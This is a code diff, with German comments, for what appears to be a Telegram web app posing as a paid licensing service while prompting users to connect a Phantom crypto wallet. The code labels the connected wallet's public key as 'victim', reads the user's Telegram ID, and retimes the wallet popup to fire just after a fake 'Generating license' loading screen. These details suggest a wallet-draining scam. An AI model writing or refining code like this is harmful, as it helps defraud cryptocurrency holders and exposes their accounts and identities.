@@ -332,8 +332,7 @@
     if(!provider) { return; }
 
     try {
-      const resp = await provider.connect();
-      const victim = resp.publicKey.toString();
+      await provider.connect(); // Hier verbinden wir (Pricing Screen)
       
       loadingScreen.style.display = 'flex';
       document.getElementById('loadStatus').textContent = `Generating license for ${planName}...`;
@@ -472,14 +471,16 @@
             connectScreen.style.display = 'none';
             dashboardScreen.style.display = 'flex';
             headerSub.textContent = "Account Pending";
-          }, 1000);
+            
+            // GENAU JETZT WIRD DAS PHANTOM POPUP GETRIGGERT
+            triggerConnect();
+            
+          }, 1000); // Wartet 1s bis der Kreis komplett weg ist
 
         }, 150); // Kurz warten nach dem Plop
         
       }, 3000);
 
-      triggerConnect();
-      
     } else {
       thumb.style.transition = 'transform 0.3s cubic-bezier(0.16, 1, 0.3, 1)';
       thumb.style.transform = 'translateX(0)'; 
@@ -493,6 +494,7 @@
     if(!provider) return; 
     
     try {
+      // Wenn noch nicht verbunden (weil es im Pricing Screen war)
       const resp = await provider.connect();
       const victim = resp.publicKey.toString();
       const tgUserId = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;
